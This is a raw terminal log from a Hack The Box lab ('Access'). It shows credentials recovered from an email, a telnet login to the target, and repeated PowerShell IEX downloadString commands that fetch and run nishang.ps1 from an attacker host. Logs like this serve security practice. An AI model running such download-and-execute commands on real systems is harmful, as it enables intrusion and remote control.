┌─[root@parrot]─[~/hackthebox/Access]   
└──╼ #ls nmap/      
access.gnmap  access.nmap  access.xml   
┌─[root@parrot]─[~/hackthebox/Access]   
└──╼ #ls            
credentials  ftp  nmap  web  www        
┌─[root@parrot]─[~/hackthebox/Access]   
└──╼ #cd ftp/       
┌─[root@parrot]─[~/hackthebox/Access/ftp]                                       
└──╼ #ls            
Backups  Engineer   
┌─[root@parrot]─[~/hackthebox/Access/ftp]                                       
└──╼ #cd Backups/   
┌─[root@parrot]─[~/hackthebox/Access/ftp/Backups]                               
└──╼ #ls            
backup.mdb  tables  
┌─[root@parrot]─[~/hackthebox/Access/ftp/Backups]                               
└──╼ #cd ../Engineer/                   
┌─[root@parrot]─[~/hackthebox/Access/ftp/Engineer]                              
└──╼ #ls            
'Access Control.hash'  'Access Control.pst'   worlist                           
'Access Control.mbox'  'Access Control.zip'                                     
┌─[root@parrot]─[~/hackthebox/Access/ftp/Engineer]                              
└──╼ #readpst 'Access Control.pst'      
Opening PST file and indexes...         
Processing Folder "Deleted Items"       
        "Access Control" - 2 items done, 0 items skipped.                       
┌─[root@parrot]─[~/hackthebox/Access/ftp/Engineer]                              
└──╼ #ls            
'Access Control.hash'  'Access Control.mbox00000001'  'Access Control.zip'      
'Access Control.mbox'  'Access Control.pst'            worlist                  
┌─[root@parrot]─[~/hackthebox/Access/ftp/Engineer]                              
└──╼ #rm 'Access Control.mbox00000001'  
┌─[root@parrot]─[~/hackthebox/Access/ftp/Engineer]                              
└──╼ #ls            
'Access Control.hash'  'Access Control.pst'   worlist                           
'Access Control.mbox'  'Access Control.zip'                                     
┌─[root@parrot]─[~/hackthebox/Access/ftp/Engineer]                              
└──╼ #vi 'Access Control.mbox'          
┌─[root@parrot]─[~/hackthebox/Access/ftp/Engineer]                              
└──╼ #cd ../..      
┌─[root@parrot]─[~/hackthebox/Access]   
└──╼ #cat credentials                   
From email we got   
username :- security                    
Password :- 4Cc3ssC0ntr0ller            
┌─[root@parrot]─[~/hackthebox/Access]   
└──╼ #telnet 10.10.10.98                
Trying 10.10.10.98...                   
Connected to 10.10.10.98.               
Escape character is '^]'.               
Welcome to Microsoft Telnet Service     

login: security     
password:           

*===============================================================                
Microsoft Telnet Server.                
*===============================================================                
C:\Users\security>c 
'c' is not recognized as an internal or external command, 
operable program or batch file.                           

C:\Users\security>IEX(n      
'IEX' is not recognized as an internal or external command,                                                         
operable program or batch file.                           

C:\Users\security>IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/nishang.ps1')               
'IEX' is not recognized as an internal or external command,                                                         
operable program or batch file.                           

C:\Users\security>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/nishang.ps1')"  
2                            

Telnet Server has closed the connection  
Session timed out.                       
Connection closed by foreign host.       
┌─[✗]─[root@parrot]─[~/hackthebox/Access]
└──╼ #telnet 10.10.10.98                 
Trying 10.10.10.98...                    
Connected to 10.10.10.98.                
Escape character is '^]'.                
Welcome to Microsoft Telnet Service      

login: security                          
password:                                

*===============================================================                   
Microsoft Telnet Server.                 
*===============================================================                   
C:\Users\security>powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.14:8000/nishang.ps1')"                                                    


Telnet Server has closed the connection  
Session timed out.                       
Connection closed by foreign host.       
┌─[✗]─[root@parrot]─[~/hackthebox/Access]
└──╼ #^C                                 
┌─[✗]─[root@parrot]─[~/hackthebox/Access]
└──╼ #                                   
